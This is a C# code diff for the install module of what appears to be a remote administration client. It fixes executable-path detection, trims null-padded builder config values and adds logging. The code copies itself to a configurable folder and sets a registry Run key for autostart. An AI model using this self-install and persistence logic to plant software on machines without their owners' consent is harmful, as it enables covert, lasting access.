@@ -19,8 +19,21 @@ namespace RemoteAdmin.Client.Modules
                     return false;
                 }
 
-                string currentPath = Assembly.GetExecutingAssembly().Location;
+                // Get current executable path
+                // For single-file apps, Assembly.GetExecutingAssembly().Location returns empty
+                // Use Environment.ProcessPath or AppContext.BaseDirectory instead
+                string currentPath = GetCurrentExecutablePath();
+
+                if (string.IsNullOrEmpty(currentPath))
+                {
+                    Console.WriteLine("ERROR: Could not determine current executable path");
+                    return false;
+                }
+
+                Console.WriteLine($"Current path: {currentPath}");
+
                 string installPath = GetInstallationPath();
+                Console.WriteLine($"Target install path: {installPath}");
 
                 // Check if already installed at the correct location
                 if (IsAlreadyInstalled(currentPath, installPath))
@@ -82,15 +95,88 @@ namespace RemoteAdmin.Client.Modules
             catch (Exception ex)
             {
                 Console.WriteLine($"Installation failed: {ex.Message}");
+                Console.WriteLine($"Stack trace: {ex.StackTrace}");
                 return false;
             }
+        }
+
+        /// <summary>
+        /// Gets the path to the currently running executable.
+        /// Handles both regular and single-file published apps.
+        /// </summary>
+        private static string GetCurrentExecutablePath()
+        {
+            // Method 1: Environment.ProcessPath (preferred for .NET 5+)
+            string path = Environment.ProcessPath;
+            if (!string.IsNullOrEmpty(path) && File.Exists(path))
+            {
+                Console.WriteLine($"Using Environment.ProcessPath: {path}");
+                return path;
+            }
+
+            // Method 2: Assembly.GetExecutingAssembly().Location
+            // This works for non-single-file apps
+            path = Assembly.GetExecutingAssembly().Location;
+            if (!string.IsNullOrEmpty(path) && File.Exists(path))
+            {
+                // For single-file, Location might be a .dll path, replace with .exe
+                if (path.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
+                {
+                    path = path.Substring(0, path.Length - 4) + ".exe";
+                }
+
+                if (File.Exists(path))
+                {
+                    Console.WriteLine($"Using Assembly.Location: {path}");
+                    return path;
+                }
+            }
+
+            // Method 3: AppContext.BaseDirectory + process name
+            // This is a fallback for edge cases
+            try
+            {
+                string baseDir = AppContext.BaseDirectory;
+                string processName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+                path = Path.Combine(baseDir, processName + ".exe");
+
+                if (File.Exists(path))
+                {
+                    Console.WriteLine($"Using AppContext.BaseDirectory: {path}");
+                    return path;
+                }
+            }
+            catch { }
+
+            // Method 4: Use System.Diagnostics.Process
+            try
+            {
+                using (var process = System.Diagnostics.Process.GetCurrentProcess())
+                {
+                    path = process.MainModule?.FileName;
+                    if (!string.IsNullOrEmpty(path) && File.Exists(path))
+                    {
+                        Console.WriteLine($"Using Process.MainModule.FileName: {path}");
+                        return path;
+                    }
+                }
+            }
+            catch { }
+
+            Console.WriteLine("ERROR: All methods to get executable path failed!");
+            return null;
         }
 
         private static string GetInstallationPath()
         {
             string basePath;
 
-            switch (ClientConfig.InstallLocation)
+            // Trim nulls from config values
+            string location = ClientConfig.InstallLocation?.TrimEnd('\0') ?? "AppData";
+            string subDir = ClientConfig.InstallSubDirectory?.TrimEnd('\0') ?? "SubDir";
+            string name = ClientConfig.InstallName?.TrimEnd('\0') ?? "Client";
+
+            switch (location)
             {
                 case "AppData":
                     basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -109,7 +195,7 @@ namespace RemoteAdmin.Client.Modules
                     break;
             }
 
-            string fullPath = Path.Combine(basePath, ClientConfig.InstallSubDirectory, ClientConfig.InstallName + ".exe");
+            string fullPath = Path.Combine(basePath, subDir, name + ".exe");
             return fullPath;
         }
 
@@ -124,10 +210,16 @@ namespace RemoteAdmin.Client.Modules
                 string normalizedCurrent = Path.GetFullPath(currentPath).ToLowerInvariant();
                 string normalizedInstall = Path.GetFullPath(installPath).ToLowerInvariant();
 
+                Console.WriteLine($"Comparing paths:");
+                Console.WriteLine($"  Current:  {normalizedCurrent}");
+                Console.WriteLine($"  Install:  {normalizedInstall}");
+                Console.WriteLine($"  Match: {normalizedCurrent == normalizedInstall}");
+
                 return normalizedCurrent == normalizedInstall;
             }
-            catch
+            catch (Exception ex)
             {
+                Console.WriteLine($"Error comparing paths: {ex.Message}");
                 return false;
             }
         }
@@ -135,17 +227,22 @@ namespace RemoteAdmin.Client.Modules
         /// <summary>
         /// Adds the application to Windows startup
         /// </summary>
-        public static void InstallStartup(string? exePath = null)
+        public static void InstallStartup(string exePath = null)
         {
             try
             {
                 if (string.IsNullOrEmpty(exePath))
                 {
-                    exePath = Assembly.GetExecutingAssembly().Location;
-                    exePath = exePath.Replace(".dll", ".exe");
+                    exePath = GetCurrentExecutablePath();
                 }
 
-                string startupName = ClientConfig.StartupName;
+                if (string.IsNullOrEmpty(exePath))
+                {
+                    Console.WriteLine("Cannot install to startup: exe path is empty");
+                    return;
+                }
+
+                string startupName = ClientConfig.StartupName?.TrimEnd('\0');
                 if (string.IsNullOrWhiteSpace(startupName))
                 {
                     startupName = "Client";
@@ -156,7 +253,7 @@ namespace RemoteAdmin.Client.Modules
                     if (key != null)
                     {
                         key.SetValue(startupName, exePath);
-                        Console.WriteLine($"Added to startup as '{startupName}'");
+                        Console.WriteLine($"Added to startup as '{startupName}' -> '{exePath}'");
                     }
                 }
             }
@@ -173,7 +270,7 @@ namespace RemoteAdmin.Client.Modules
         {
             try
             {
-                string startupName = ClientConfig.StartupName;
+                string startupName = ClientConfig.StartupName?.TrimEnd('\0');
                 if (string.IsNullOrWhiteSpace(startupName))
                 {
                     startupName = "Client";
